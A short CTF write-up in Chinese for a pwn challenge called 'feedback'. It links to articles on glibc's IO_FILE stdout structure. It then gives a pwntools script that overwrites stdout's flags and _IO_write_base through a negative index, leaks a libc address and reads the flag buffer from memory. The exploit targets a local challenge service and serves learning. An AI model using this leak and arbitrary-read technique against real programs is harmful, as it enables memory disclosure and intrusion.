# feedback

打io_file的stdout

https://n0va-scy.github.io/2019/09/21/IO_FILE/ ：stdout结构

https://pzhxbz.cn/?p=139 和 https://changochen.github.io/2018-11-26-bctf-2018.html ：利用stdout泄露libc地址。不过这个地址是随机的，可以用来算与flag buf的偏移

https://xz.aliyun.com/t/5853#toc-5 ：如何使用stdout进行任意地址读（地址要已知，刚才算出来的）
```py
from pwn import *
p=remote("localhost",53053)
def feedback(index,payload):
    p.sendlineafter("write?",str(index))
    if len(payload)<0x48:
        p.sendlineafter("feedback.",payload)
    else:
        p.sendlineafter("feedback.",payload[:-1])
payload=p64(0xfbad3c80)+p64(0)*3+p8(0) #_flags+_IO_read_ptr+_IO_read_end+_IO_read_base覆盖_IO_write_base的最后一个字节。目标是改小_IO_write_base
#覆盖后_IO_write_base到_IO_write_ptr中间的内存就会被泄露出来
offset=-8
feedback(offset,payload)
flag_buf=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))+19840 #调试得到的偏移
flags=0xfbad1800
flags&=~8
flags|=0x800
flags|=0x8000
payload=p64(flags)+p64(0)*3+p64(flag_buf)+p64(flag_buf+100) #和上面一样的道理，只不过这次直接指定地址即可
feedback(offset,payload)
print(p.recvall(timeout=1))
```
当地址未知时，覆盖_IO_write_base的最后一个字节将其改小就能泄露libc地址（非常常用的技巧）。一般都能成功，只有一种情况例外：_IO_write_base最后一个字节本身就很小，比如是`0x3`。这时改成`\x00`也只能泄露0x3个字节（`_IO_write_ptr`默认和`_IO_write_base`一样）。如果很不幸这三个字节全是null就寄了